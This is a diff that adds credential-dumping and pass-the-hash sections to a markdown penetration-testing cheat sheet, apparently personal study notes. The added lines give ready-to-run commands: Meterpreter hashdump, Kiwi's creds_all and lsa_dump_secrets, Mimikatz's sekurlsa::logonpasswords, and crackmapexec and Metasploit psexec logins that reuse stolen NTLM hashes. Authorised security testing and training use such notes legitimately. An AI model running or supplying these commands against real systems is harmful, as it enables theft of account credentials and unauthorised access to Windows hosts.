@@ -99,12 +99,39 @@
 
 <details>
 <summary>Credential Dumping (Mimikatz - Kiwi - Hashdump)</summary>
-  
-- Prerequisites: NT AUTHORITY\SYSTEM user
+    
+- Prerequisites: User must be a member a local Administrators.
 1) Method (Metasploit - Meterpreter)
+   - You may need to migrate meterpreter to NT AUTHORITY\SYSTEM process (ex. `migrate <PID explorer.exe>`)
    - `hashdump`
+2) Kiwi (Metasploit - Meterpreter)
+   - You may need to migrate meterpreter to NT AUTHORITY\SYSTEM process (ex. `migrate <PID explorer.exe>`)
+   - `load kiwi`
+   - `creds_all` Retrieve all credentials (parsed)
+   - `lsa_dump_sam` Here you can see that NTLM hashes for all of the user accounts on the system.
+   - To find the clear text passwords -> `lsa_dump_secrets`
+     - However, from the Windows version 8.0+, windows don’t store any plain text password. So, it can be helpful for the older version of the Windows.
+3) Mimikatz
+   - upload mimikatz.exe
+   - `\mimkatz.exe`
+   - `privilege::debug` - should return Privilege '20' OK - This should be a standard for running mimikatz as it needs local administrator access
+   - `lsadump::sam`
+   - `sekurlsa::logonpasswords`
 
 </details>
+
+<details>
+<summary>Pass the Hash</summary>
+
+Useful for persinstence...
+1) `crackmapexec smb <ip> -u <administrator> -H <NTLM hash> -x "ipconfig"`
+2) Metasploit -> windows/smb/psexec and set SMBPass with `<LM hash>:<NTLM hash>`
+   - empty LM hash -> `AAD3B435B51404EEAAD3B435B51404EE` (means its non-use).
+     - `AAD3B435B51404EEAAD3B435B51404EE:<NTLM>`
+   - With `hashdump` you have the right format
+  
+</details>
+
 
 - Powershell History
 - Saved Windows Credentials
